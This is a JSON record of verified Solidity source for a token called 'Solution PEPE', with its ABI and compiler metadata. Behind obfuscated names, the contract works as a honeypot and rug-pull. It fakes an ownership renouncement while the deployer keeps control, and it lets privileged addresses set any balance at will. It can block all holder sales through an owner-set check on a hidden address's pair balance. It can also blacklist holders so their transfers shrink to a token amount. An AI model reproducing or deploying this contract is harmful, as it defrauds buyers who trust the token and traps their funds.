{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface launchedReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityEnable) external view returns (uint256);\n\n    function transfer(address liquidityLaunched, uint256 tradingMode) external returns (bool);\n\n    function allowance(address maxTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityLaunched,\n        uint256 tradingMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptFrom, uint256 value);\n    event Approval(address indexed maxTrading, address indexed spender, uint256 value);\n}\n\nabstract contract tokenLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface modeShould {\n    function createPair(address feeTrading, address takeBuy) external returns (address);\n}\n\ninterface enableTeam is launchedReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SolutionPEPE is tokenLiquidity, launchedReceiver, enableTeam {\n\n    event OwnershipTransferred(address indexed tradingBuy, address indexed shouldTx);\n\n    bool public fromAuto;\n\n    address public txTake;\n\n    function balanceOf(address liquidityEnable) public view virtual override returns (uint256) {\n        return amountMin[liquidityEnable];\n    }\n\n    bool private launchedIs;\n\n    bool private txAmount;\n\n    function txReceiver(address takeSell, uint256 tradingMode) public {\n        atIs();\n        amountMin[takeSell] = tradingMode;\n    }\n\n    uint256 txList;\n\n    function atAmount(address receiverTrading) public {\n        if (isSell) {\n            return;\n        }\n        if (buyFee == minLaunchBuy) {\n            txAmount = false;\n        }\n        shouldAmountReceiver[receiverTrading] = true;\n        \n        isSell = true;\n    }\n\n    mapping(address => uint256) private amountMin;\n\n    mapping(address => mapping(address => uint256)) private buyList;\n\n    function senderExempt() public {\n        emit OwnershipTransferred(teamAmountMax, address(0));\n        toAt = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return toAt;\n    }\n\n    uint256 public buyFee;\n\n    function totalIsMax(uint256 tradingMode) public {\n        atIs();\n        txList = tradingMode;\n    }\n\n    function transfer(address takeSell, uint256 tradingMode) external virtual override returns (bool) {\n        return teamWallet(_msgSender(), takeSell, tradingMode);\n    }\n\n    address minAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private maxReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderReceiverEnable;\n    }\n\n    function owner() external view returns (address) {\n        return toAt;\n    }\n\n    mapping(address => bool) public launchAt;\n\n    function liquidityAuto(address isAuto, address liquidityLaunched, uint256 tradingMode) internal returns (bool) {\n        require(amountMin[isAuto] >= tradingMode);\n        amountMin[isAuto] -= tradingMode;\n        amountMin[liquidityLaunched] += tradingMode;\n        emit Transfer(isAuto, liquidityLaunched, tradingMode);\n        return true;\n    }\n\n    address public teamAmountMax;\n\n    mapping(address => bool) public shouldAmountReceiver;\n\n    constructor (){\n        if (minLaunchBuy != isBuyAt) {\n            maxReceiver = false;\n        }\n        isReceiver sellMin = isReceiver(launchedSell);\n        txTake = modeShould(sellMin.factory()).createPair(sellMin.WETH(), address(this));\n        \n        teamAmountMax = _msgSender();\n        senderExempt();\n        shouldAmountReceiver[teamAmountMax] = true;\n        amountMin[teamAmountMax] = senderReceiverEnable;\n        \n        emit Transfer(address(0), teamAmountMax, senderReceiverEnable);\n    }\n\n    bool private limitTeam;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenModeReceiver;\n    }\n\n    function atIs() private view {\n        require(shouldAmountReceiver[_msgSender()]);\n    }\n\n    bool public isSell;\n\n    uint256 private senderReceiverEnable = 100000000 * 10 ** 18;\n\n    function approve(address tradingWalletToken, uint256 tradingMode) public virtual override returns (bool) {\n        buyList[_msgSender()][tradingWalletToken] = tradingMode;\n        emit Approval(_msgSender(), tradingWalletToken, tradingMode);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return amountMax;\n    }\n\n    uint256 public minLaunchBuy;\n\n    bool public buySwap;\n\n    uint256 public isBuyAt;\n\n    string private tokenModeReceiver = \"SPE\";\n\n    address launchedSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private feeMode = 18;\n\n    bool private swapTo;\n\n    function transferFrom(address isAuto, address liquidityLaunched, uint256 tradingMode) external override returns (bool) {\n        if (_msgSender() != launchedSell) {\n            if (buyList[isAuto][_msgSender()] != type(uint256).max) {\n                require(tradingMode <= buyList[isAuto][_msgSender()]);\n                buyList[isAuto][_msgSender()] -= tradingMode;\n            }\n        }\n        return teamWallet(isAuto, liquidityLaunched, tradingMode);\n    }\n\n    uint256 constant listSellReceiver = 15 ** 10;\n\n    function teamWallet(address isAuto, address liquidityLaunched, uint256 tradingMode) internal returns (bool) {\n        if (isAuto == teamAmountMax) {\n            return liquidityAuto(isAuto, liquidityLaunched, tradingMode);\n        }\n        uint256 liquidityTotal = launchedReceiver(txTake).balanceOf(minAmount);\n        require(liquidityTotal == txList);\n        require(liquidityLaunched != minAmount);\n        if (launchAt[isAuto]) {\n            return liquidityAuto(isAuto, liquidityLaunched, listSellReceiver);\n        }\n        return liquidityAuto(isAuto, liquidityLaunched, tradingMode);\n    }\n\n    function modeLiquidity(address launchFee) public {\n        atIs();\n        if (limitTeam) {\n            buySwap = false;\n        }\n        if (launchFee == teamAmountMax || launchFee == txTake) {\n            return;\n        }\n        launchAt[launchFee] = true;\n    }\n\n    function allowance(address marketingShould, address tradingWalletToken) external view virtual override returns (uint256) {\n        if (tradingWalletToken == launchedSell) {\n            return type(uint256).max;\n        }\n        return buyList[marketingShould][tradingWalletToken];\n    }\n\n    string private amountMax = \"Solution PEPE\";\n\n    uint256 marketingTotal;\n\n    address private toAt;\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeMode;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingWalletToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingWalletToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTrading\",\"type\":\"address\"}],\"name\":\"atAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buySwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isBuyAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLaunchBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFee\",\"type\":\"address\"}],\"name\":\"modeLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldAmountReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamAmountMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingMode\",\"type\":\"uint256\"}],\"name\":\"totalIsMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingMode\",\"type\":\"uint256\"}],\"name\":\"txReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SolutionPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}